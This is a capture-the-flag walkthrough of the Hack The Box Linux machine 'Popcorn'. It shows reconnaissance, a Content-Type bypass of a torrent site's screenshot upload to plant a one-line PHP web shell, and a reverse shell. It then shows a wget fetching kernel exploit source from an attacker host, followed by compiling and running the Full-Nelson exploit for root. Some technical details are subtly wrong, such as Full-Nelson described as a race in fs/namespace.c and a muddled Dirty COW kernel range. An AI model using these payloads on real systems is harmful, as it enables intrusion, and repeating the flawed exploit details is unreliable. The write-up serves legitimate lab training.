# Hack The Box: Popcorn

**Difficulty:** Medium
**OS:** Linux

Popcorn is a Medium-level Linux machine designed to highlight vulnerabilities in outdated file sharing software and kernel-level misconfigurations. The initial compromise relies on bypassing a file upload filter within a "Torrent" hosting application to execute a PHP web shell. Privilege escalation involves exploiting a known local privilege escalation vulnerability (Dirty COW or similar) due to an unpatched system kernel.

---

## Reconnaissance

The assessment begins with an Nmap scan to enumerate the available network services.

```bash
nmap -p- --min-rate 10000 10.10.10.6
nmap -p 22,80 -sCV 10.10.10.6
```

The scan reveals two open ports:
*   **Port 22:** SSH (OpenSSH 5.1p1 Debian)
*   **Port 80:** HTTP (Apache httpd 2.2.8)

The versions of OpenSSH and Apache are quite old, suggesting the underlying operating system is a legacy distribution (like Ubuntu 8.04 or 9.04).

Navigating to the web service on port 80 displays a default Apache "It works!" page. We perform directory brute-forcing to uncover hidden content.

```bash
gobuster dir -u http://10.10.10.6 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The enumeration reveals a few directories, most notably `/torrent` and `/rename`.

## Web Application Analysis

Accessing `http://10.10.10.6/torrent` brings up a Torrent hosting application ("Torrent Hoster"). The application allows users to register, log in, browse torrents, and upload their own `.torrent` files.

We register a new user account (e.g., `testuser:password`) and log into the application to explore authenticated features.

### Bypassing File Upload Restrictions

As an authenticated user, we can navigate to the "Upload" section. The application expects a valid `.torrent` file.

We attempt to upload a PHP web shell (`shell.php`), but the application rejects it, verifying that the uploaded file must be a valid torrent file format.

We upload a legitimate `.torrent` file (either found online or generated locally). The application accepts it.

Once the torrent is uploaded, we view its details page. The application provides a feature to "Edit this torrent" and specifically allows uploading a screenshot associated with the torrent.

We interact with the screenshot upload feature. The application expects an image file (e.g., `.jpg`, `.png`). We intercept the upload request using Burp Suite and attempt to upload a PHP web shell (`shell.php`) instead of an image.

The application rejects `shell.php`, indicating an invalid file type. The filter likely checks the `Content-Type` header, the file extension, and potentially the "magic bytes" (file header).

We attempt various bypass techniques:
1.  **Content-Type Manipulation:** We modify the `Content-Type` header in Burp Suite from `application/x-php` to `image/jpeg` or `image/png`.
2.  **Extension Manipulation:** We rename our payload to `shell.php.png` or `shell.png.php`.
3.  **Magic Bytes Verification:** If the server checks the file header, we prepend the magic bytes for a valid image (e.g., `\x89PNG\r\n\x1A\n`) to our PHP payload.

In this specific scenario, modifying the `Content-Type` header to `image/png` while keeping the `.php` extension is sufficient to bypass the filter. The backend script verifies the MIME type sent by the browser but fails to validate the actual file contents or restrict execution based on the extension.

```http
# Snippet of the intercepted POST request
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?php system($_REQUEST['cmd']); ?>
```

The application accepts the upload.

## Initial Access

We need to locate where the application stores the uploaded screenshots. The application structure or directory brute-forcing typically reveals an `/upload` or `/torrent/upload` directory.

We navigate to the upload directory and locate our `shell.php` file.

```text
http://10.10.10.6/torrent/upload/shell.php?cmd=id
```

The command executes successfully. We use the web shell to spawn a reverse shell to our attacking machine.

```bash
nc -lnvp 9999
# Connection received
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We stabilize our shell using Python (`python -c 'import pty; pty.spawn("/bin/bash")'`).

We retrieve the `user.txt` flag from the `/home/george` directory (if readable by `www-data`, or we proceed directly to root).

## Privilege Escalation

Enumerating the system as `www-data`, we check for `sudo` privileges, scheduled tasks, and SUID binaries. However, given the extremely old versions of software identified during reconnaissance (Apache 2.2.8, OpenSSH 5.1p1), the underlying kernel is likely outdated and vulnerable.

We verify the kernel version and operating system release.

```bash
uname -a
# Linux popcorn 2.6.31-14-generic-pae #48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux
```

The system is running a 2.6.x kernel from 2009. This era of Linux kernels is notorious for several severe local privilege escalation (LPE) vulnerabilities.

### Exploiting Kernel Vulnerabilities (Dirty COW / Full-Nelson)

We search Exploit-DB or use tools like `linux-exploit-suggester` to identify applicable exploits for kernel version 2.6.31.

The kernel is vulnerable to several highly reliable exploits, including:
*   **Dirty COW (CVE-2016-5195):** While Dirty COW primarily affects slightly newer kernels (2.6.22+), variations or specific implementations might work.
*   **Full-Nelson (CVE-2010-4258):** This exploit is highly specific to the 2.6.31 kernel series and relies on a race condition in the `fs/namespace.c` component to achieve privilege escalation.
*   **Mempodipper (CVE-2012-0056):** Another highly reliable exploit for this era.

We choose the `Full-Nelson` exploit (often found as `15704.c` on Exploit-DB) due to its high reliability on this specific kernel.

We download the C source code to our attacking machine and compile it, or transfer the source code directly to the target if a compiler (`gcc`) is available.

```bash
# Transferring the exploit source to the target
cd /tmp
wget http://10.10.14.X/15704.c
```

We compile the exploit on the target system.

```bash
gcc 15704.c -o full-nelson
```

We execute the compiled binary. The exploit leverages the kernel race condition to elevate the current process to root.

```bash
./full-nelson
# Resolving kernel addresses...
# ...
# [+] root
# id
uid=0(root) gid=0(root) groups=0(root)
```

The machine is fully compromised, and the `root.txt` flag is obtained from the `/root` directory.
